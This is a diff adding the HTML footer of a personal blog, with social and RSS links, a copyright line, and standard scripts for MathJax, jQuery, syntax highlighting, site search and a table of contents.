+    <li><a href="https://github.com/fmash16" target="_blank" title="github" data-toggle=tooltip data-placement=top >
+            <i class="icon icon-github"></i></a></li>
+    <li><a href="/index.xml" target="_blank" title="rss" data-toggle=tooltip data-placement=top >
+            <i class="icon icon-rss"></i></a></li>
+    <li><a href="https://twitter.com/fmash16" target="_blank" title="twitter" data-toggle=tooltip data-placement=top >
+            <i class="icon icon-twitter"></i></a></li>
+</ul>
+  <div class="copyright">
+    &copy;2020  -
+    2020
+    
+    
+    </div>
+  </div>
+</footer>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/MathJax.js?config=TeX-MML-AM_SVG"></script>
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+            showMathMenu: false, //disables context menu
+            tex2jax: {
+            inlineMath: [ ['$','$'], ['\\(','\\)'] ]
+           }
+    });
+</script>
+
+
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js"></script>
+<script>
+    window.jQuery || document.write('<script src="js/jquery.min.js"><\/script>')
+</script>
+<script type="text/javascript" src="https://cdn.staticfile.org/highlight.js/9.15.10/highlight.min.js"></script><script>
+    hljs.configure({
+        tabReplace: '    ', 
+        classPrefix: ''     
+        
+    })
+    hljs.initHighlightingOnLoad();
+</script>
+<script src="/js/application.min.bdeb64b910570b6c41badc6a05b7afb0c8ad9efd8525de3c7257d59e786326a3.js"></script>
+<script src="/js/plugin.min.51ff8c7317566f82259170fa36e09c4493adc9b9378b427a01ad3f017ebac7dd.js"></script>
+
+<script>
+    (function (window) {
+        var INSIGHT_CONFIG = {
+            TRANSLATION: {
+                POSTS: 'Posts',
+                PAGES: 'Pages',
+                CATEGORIES: 'Categories',
+                TAGS: 'Tags',
+                UNTITLED: '(Untitled)',
+            },
+            ROOT_URL: '\/',
+            CONTENT_URL: '\/\/searchindex.json ',
+        };
+        window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+    })(window);
+</script>
+<script type="text/javascript" src="/js/insight.min.7f3407251ef14950645ac695d0cf7cd29c5cabfb6916e63dcb54b83d8f1fc2126d10bd5446875e78d27a76ecd651a3532b49a7e4da02ee4de51660edba2d23f1.js" defer></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+<script>
+    tocbot.init({
+        
+        tocSelector: '.js-toc',
+        
+        contentSelector: '.js-toc-content',
+        
+        headingSelector: 'h1, h2, h3',
+        
+        hasInnerContainers: true,
+    });
+</script>
+
+
+  </body>
+</html>
